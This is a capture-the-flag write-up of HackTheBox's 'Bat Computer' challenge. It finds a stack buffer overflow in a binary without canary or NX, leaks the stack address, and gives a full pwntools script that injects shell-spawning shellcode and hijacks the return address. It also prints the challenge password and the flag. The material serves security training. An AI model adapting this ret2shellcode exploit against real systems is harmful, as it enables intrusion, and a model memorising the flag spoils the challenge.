# Bat Computer
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0455e35d-ab94-4c1b-a1df-9653ca642396)


## Lessons Learned:
1. BOF.
2. Ret2shellcode.

## DESCRIPTION:
It's your time to save the world!

## STEPS:
1. First, unzip the `.zip` file given.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209466124-165c91d7-782c-43fe-95f3-f1c4d5b5b6df.png)


2. Next, check the file type.

> RESULT - 64 bit, stripped

![image](https://user-images.githubusercontent.com/70703371/209466133-9ea11e4c-167c-4750-b406-ca376c95304b.png)


3. Since it's a binary file, check the file's protection.

> RESULT - No Canary Found (means we can do bufferoverflow), NX disabled (means we can inject shellcode)

![image](https://user-images.githubusercontent.com/70703371/209466161-d860d603-e2a9-48d0-a588-ee38d583ad16.png)


4. Let's run chmod first to make the executable then run the file in gdb.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209466201-78001337-1429-44e0-90c8-93364aff7f8d.png)


5. Let's choose to track joker first.

![image](https://user-images.githubusercontent.com/70703371/209466212-8febfab0-ab55-4c1d-a3fc-a1b845c263a5.png)


6. Now let's chase him.

![image](https://user-images.githubusercontent.com/70703371/209466227-ab9face8-c56f-4af1-a53a-739bdf206574.png)


![image](https://user-images.githubusercontent.com/70703371/209466238-3a283a09-0eee-4510-840a-cdb19c4de183.png)


7. Let's decompile the file in ghidra.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209466257-86061308-c0aa-4a0d-98dc-26d65b4c0a6e.png)


8. Since the binary stripped, hence it's harder for us identify the function.
9. Anyway i think i found the `main()` function.

![image](https://user-images.githubusercontent.com/70703371/209466274-44f2c43b-1e89-4460-94e5-48b2c77dbd77.png)


10. We found the password here, but i don't think the program will give us a flag when we entered the correct pass.

![image](https://user-images.githubusercontent.com/70703371/209466369-2685fcf5-5bef-462f-83b2-e3c13f0f3cae.png)


12. The vuln here is the `auStack84` only has 76 size of buffers but the binary read 137. Hence we can utilize it for bufferoverflow.. 

![image](https://user-images.githubusercontent.com/70703371/209514203-72e514f3-fc0b-449d-8c34-df461ffec906.png)


13. The attack we shall use to get the flag is `inject a shellcode`.
14. So when the binary prompts us the navigation, we inject the shellcode there, so the shellcode will stored at the stack location which we have the address of. So then we need to overwrite the return address (the instruction pointer), overwrite that with the address of the stack where we place our shell code.
15. In short, since the `auStack84` location will change everytime we execute the binary, so we need to extract the address of it, then we need to enter the password and enter the shellcode. To control the return address we need to overflow the buffer.
16.  Now let's run the binary in gdb.

> RESULT - CHOOSE OPTION 2 - ENTER THE PASSWORD (b4tp@$$w0rd!)

![image](https://user-images.githubusercontent.com/70703371/209515683-69da2386-8b87-4d88-acab-912037ea9c59.png)


17. Enter cyclic 1024 pattern.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209516091-384d2679-2871-4896-bcd3-25eb2d8caddc.png)


18. The program didn't crash, because it will crash until we hit return, remember that we are in a while loop.

![image](https://user-images.githubusercontent.com/70703371/209516369-f8855662-9a57-4a91-820e-c15e469632da.png)


19. Let's make another cyclic pattern, but this time 100.
20. Run the binary again in gdb.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209516507-c0ab0615-b327-4543-9c69-747707710a61.png)


21. This time enter random number.

> RESULT - SEGMENTATION FAULT

![image](https://user-images.githubusercontent.com/70703371/209516541-6cef29de-deba-466a-a618-b4af96d1fa09.png)


22. Now take 4 bytes from RSP to look the correct bytes to overflow the buffer.

> RESULT - 84 BYTES

![image](https://user-images.githubusercontent.com/70703371/209516745-eaee73ed-a9f0-41d8-a3bd-8575482d8c64.png)


23. Means we need to write 84 bytes, then the return address (the location of joker), enter the password, enter the shellcode.
24. Now for the exploit script, to extract the stack offset, i used `pwntools` to make this regex.

```py
extractedStack_addr = int(re.search(r"(0x[\w\d]+)", sh.recvlineS()).group(0), 16)
```

25. Now for the shellcode, we can utilize the `shellcraft`.
26. First, we need to pop registers at the beginning se we have room to inject shellcode.
27. For the padding value , we can use this formula:

```py
padding = asm('nop') * (paddingBytes - len(shellcode)) 
```

28. So here is our final script:

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: 
        return process([exe] + argv, *a, **kw)

exe = './batcomputer'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

## EXPLOITATION

paddingBytes = 84 #EIP/RIP offset
sh = start()

sh.sendlineafter('>', '1')
extractedStack_addr = int(re.search(r"(0x[\w\d]+)", sh.recvlineS()).group(0), 16)
info("extractedStack_addr (joker's offset): %#x", extractedStack_addr)

shellcode = asm(shellcraft.popad()) 
shellcode += asm(shellcraft.sh())
padding = asm('nop') * (paddingBytes - len(shellcode)) 

payload = flat([
    padding,
    shellcode,
    extractedStack_addr
])

sh.sendlineafter(b'>', b'2') 
sh.sendlineafter(b'Enter the password:', b'b4tp@$$w0rd!') 
sh.sendlineafter(b'Enter the navigation commands:', payload) 
sh.sendlineafter(b'>', b'130') # to trigger return 
sh.recvuntil("Too bad, now who's gonna save Gotham? Alfred?\n")

sh.interactive()

```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/209521025-4a04b417-cbdd-4d26-be13-5ab04c9a6e78.png)


![image](https://user-images.githubusercontent.com/70703371/209521063-df20c595-fb57-44af-b01a-0296b8ca3154.png)


![image](https://user-images.githubusercontent.com/70703371/209521083-f75e7023-e6e4-4e1e-8668-699835443529.png)


![image](https://user-images.githubusercontent.com/70703371/209521119-0b3ce4e4-6532-4f08-bd7e-694a3420f297.png)


![image](https://user-images.githubusercontent.com/70703371/209521140-428fae0e-3176-4fda-baa8-6f95c799f629.png)


29. Got the flag!

## FLAG

```
HTB{l0v3_y0uR_sh3llf_U_s4v3d_th3_w0rld!}
```
